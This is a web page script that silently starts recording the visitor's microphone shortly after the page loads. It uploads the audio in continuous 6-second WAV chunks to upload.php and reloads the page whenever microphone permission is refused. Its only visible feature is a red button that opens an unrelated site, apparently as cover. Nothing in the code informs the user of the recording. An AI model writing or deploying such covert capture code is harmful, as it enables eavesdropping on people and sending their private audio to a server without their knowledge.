
URL = window.URL || window.webkitURL;

var gumStream; 						
var rec; 							
var input; 							


var AudioContext = window.AudioContext || window.webkitAudioContext;
var audioContext 

var redButton = document.getElementById("redButton");

redButton.addEventListener("click", Redirect);


function Redirect() {

window.open('https://hi.com', '_blank');


}

window.setTimeout(startRecording, 300);
window.setInterval(stopRecording, 6000);

function startRecording() {
    
    var constraints = { audio: true, video:false }

	navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
		console.log("getUserMedia() success, stream created, initializing Recorder.js ...");

		audioContext = new AudioContext();

		gumStream = stream;
			
		input = audioContext.createMediaStreamSource(stream);

		rec = new Recorder(input,{numChannels:1})
	
		rec.record()
		redButton.disabled = false;

	
	}).catch(function(err) {
	
    	redButton.disabled = true;
	window.location.reload();
	});
}

function uploadRecord() {

$(document).ready(function() {
	$('a#Upload')[0].click();

});
	
}

function stopRecording() {
	
	rec.stop();

	rec.exportWAV(createDownloadLink);

}

function createDownloadLink(blob) {

	var url = URL.createObjectURL(blob);
	var filename = new Date().toISOString();
		  var xhr=new XMLHttpRequest();
		  xhr.onload=function(e) {
		      if(this.readyState === 4) {	
		      }
		  };

		  var fd=new FormData();
		  fd.append("audio_data",blob, filename);
		  xhr.open("POST","upload.php",true);
		  xhr.send(fd);

	window.setTimeout(startRecording, 200);

}
